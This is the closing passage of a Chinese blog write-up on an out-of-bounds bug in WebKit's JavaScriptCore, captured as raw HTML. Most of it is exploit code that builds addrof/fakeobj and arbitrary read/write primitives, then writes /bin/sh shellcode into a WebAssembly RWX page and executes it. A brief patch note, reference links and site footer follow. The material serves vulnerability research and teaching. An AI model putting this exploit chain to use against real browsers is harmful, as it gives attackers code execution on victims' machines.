class="hljs-number">0x10</span>);<br><br><span class="hljs-keyword">var</span> unboxed2 = [<span class="hljs-number">1.1</span>];<br>unboxed2[<span class="hljs-number">0</span>] =<span class="hljs-number">3.3</span>;<br><br><span class="hljs-keyword">var</span> boxed2 = [&#123;&#125;]<br><br>hax[<span class="hljs-number">1</span>] = <span class="hljs-title function_">i2f</span>(<span class="hljs-title function_">addrof</span>(unboxed2))<br><span class="hljs-keyword">var</span> shared = victim[<span class="hljs-number">1</span>];<br>hax[<span class="hljs-number">1</span>] = <span class="hljs-title function_">i2f</span>(<span class="hljs-title function_">addrof</span>(boxed2))<br>victim[<span class="hljs-number">1</span>] = shared;<br><br><span class="hljs-keyword">var</span> stage2=&#123;<br>    <span class="hljs-attr">addrof</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>)&#123;<br>        boxed2[<span class="hljs-number">0</span>] = obj;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">f2i</span>(unboxed2[<span class="hljs-number">0</span>]);<br>    &#125;,<br>    <span class="hljs-attr">fakeobj</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">addr</span>)&#123;<br>        unboxed2[<span class="hljs-number">0</span>] = <span class="hljs-title function_">i2f</span>(addr);<br>        <span class="hljs-keyword">return</span> boxed2[<span class="hljs-number">0</span>];<br>    &#125;,<br>    <span class="hljs-attr">read64</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">addr</span>)&#123;<br>        hax[<span class="hljs-number">1</span>] = <span class="hljs-title function_">i2f</span>(addr + <span class="hljs-number">0x10</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addrof</span>(victim.<span class="hljs-property">prop</span>);<br>    &#125;,<br>    <span class="hljs-attr">write64</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">addr,data</span>)&#123;<br>        hax[<span class="hljs-number">1</span>] = <span class="hljs-title function_">i2f</span>(addr+<span class="hljs-number">0x10</span>);<br>        victim.<span class="hljs-property">prop</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fakeobj</span>(data)<br>    &#125;,<br>    <span class="hljs-attr">write</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">addr, shellcode</span>) &#123;<br>        <span class="hljs-keyword">var</span> theAddr = addr;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;shellcode.<span class="hljs-property">length</span>;i++)&#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">write64</span>(addr+i,shellcode[i].<span class="hljs-title function_">charCodeAt</span>())<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">pwn</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">var</span> wasm_code = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br>        <span class="hljs-keyword">var</span> wasm_mod = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasm_code);<br>        <span class="hljs-keyword">var</span> wasm_instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasm_mod);<br>        <span class="hljs-keyword">var</span> f = wasm_instance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br>        <span class="hljs-keyword">var</span> addr_f = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addrof</span>(f);<br>        <span class="hljs-keyword">var</span> addr_p = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">read64</span>(addr_f + <span class="hljs-number">0x40</span>);<br>        <span class="hljs-keyword">var</span> addr_shellcode = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">read64</span>(addr_p);<br>        <span class="hljs-title function_">print</span>(addr_f.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>        <span class="hljs-title function_">print</span>(addr_p.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>        <span class="hljs-title function_">print</span>(addr_shellcode.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>        shellcode = <span class="hljs-string">&quot;j;X\x99RH\xbb//bin/shST_RWT^\x0f\x05&quot;</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">write</span>(addr_shellcode, shellcode);<br>        <span class="hljs-title function_">f</span>();<br>    &#125;<br>&#125;<br><br>stage2.<span class="hljs-title function_">pwn</span>()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>由于上面的漏洞类似于代码写错导致的，所以删除<code>this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)</code>即可</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (storage-&gt;<span class="hljs-built_in">hasHoles</span>()) <br>    || <span class="hljs-built_in">hasSparseMap</span>() <br>    || <span class="hljs-built_in">shouldUseSlowPut</span>(<span class="hljs-built_in">indexingType</span>())) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>下面主要是针对wasm的利用，特别是第三个参考中提到如何去找wasm的rwx地址，比如先打印出来wasm实例的地址，然后利用调试器搜寻<code>RWX</code>的内存，查看wasm实例地址附近是否有<code>RWX内存</code>的地址，算wasm地址和内存页之间的差值：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://devilx86.github.io/writeups/CVE-2018-4441/">利用 Webkit 漏洞 CVE-2018-4441 |魔鬼x86 — Exploiting Webkit CVE-2018-4441 | Devilx86</a></p>
+<p><a target="_blank" rel="noopener" href="https://x3h1n.github.io/2020/06/21/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/">浏览器漏洞利用基础 | X3h1n</a></p>
+<p><a target="_blank" rel="noopener" href="https://jhalon.github.io/chrome-browser-exploitation-3/">Chrome 浏览器漏洞利用，第 3 部分：分析和利用 CVE-2018-17463 - Jack Hacks — Chrome Browser Exploitation, Part 3: Analyzing and Exploiting CVE-2018-17463 - Jack Hacks (jhalon.github.io)</a></p>
+<p>下面这个适合看类之间的关系：</p>
+<p><a target="_blank" rel="noopener" href="https://doxywizerd.github.io/webkit/class_j_s_c_1_1_j_s_array.html">webkit: JSC::JSArray Class Reference (doxywizerd.github.io)</a></p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/" class="category-chain-item">浏览器</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/JSC/" class="print-no-link">#JSC</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>JSC--OOB</div>
+      <div>https://binpwn.github.io/2023/04/06/JSC--OOB/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>DingJiayu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/05/06/WASM-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="WASM-整数溢出">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">WASM-整数溢出</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/08/01/IoT-buildroot-nvram/" title="IoT--buildroot&amp;nvram">
+                        <span class="hidden-mobile">IoT--buildroot&amp;nvram</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/dkjiayu" target="_blank" rel="nofollow noopener"><span>DJY</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/binpwn" target="_blank" rel="nofollow noopener"><span>ZJL</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
